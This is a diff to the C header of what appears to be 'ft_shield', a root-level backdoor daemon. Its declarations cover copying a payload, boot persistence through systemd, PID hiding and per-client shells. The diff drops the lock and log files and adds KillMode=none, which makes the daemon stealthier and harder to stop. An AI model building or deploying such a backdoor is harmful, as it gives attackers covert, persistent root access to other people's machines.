@@ -28,12 +28,7 @@
 #define	sock_in		struct sockaddr_in
 #define	sock_addr	struct sockaddr
 #define	poll_fd		struct pollfd
-#define LOCK_FILE "/var/lock/matt_daemon.lock"
-// #define LOCK_FILE "/Users/cx02938/Desktop/matt_daemon.lock"
-// Log file
-#define LOG_PATH  "/var/log/"
-#define LOG_NAME  "ft_shield.log"
-#define LOG_FILE  LOG_PATH LOG_NAME
+
 // executable
 #define EXECUTABLE_NAME "ft_shield"
 #define EXECUTABLE_PATH "/usr/bin/"
@@ -50,6 +45,7 @@
 "ExecStart=/usr/bin/ft_shield\n" \
 "Restart=on-failure\n" \
 "User=root\n" \
+"KillMode=none\n" \
 "\n" \
 "[Install]\n" \
 "WantedBy=multi-user.target\n"
@@ -61,7 +57,6 @@
 typedef struct s_daemon
 {
     sock_in         _addr;
-    int             _lock_file_fd;
     int             _socket_fd;
     struct pollfd   _poll_fds[MAX_CLIENTS + 1];
     pid_t           _shell_pids[MAX_CLIENTS];
@@ -78,7 +73,6 @@ void        ft_daemonize(void);
 void        copy_payload(char *curdir);
 void        startup_setup(void);
 void        hide_pid(void);
-void        create_lock_file(t_daemon *daemon);
 void        init_pollfd(t_daemon *daemon);
 void        server_listen(t_daemon *daemon);
 bool        fd_ready( t_daemon *daemon );
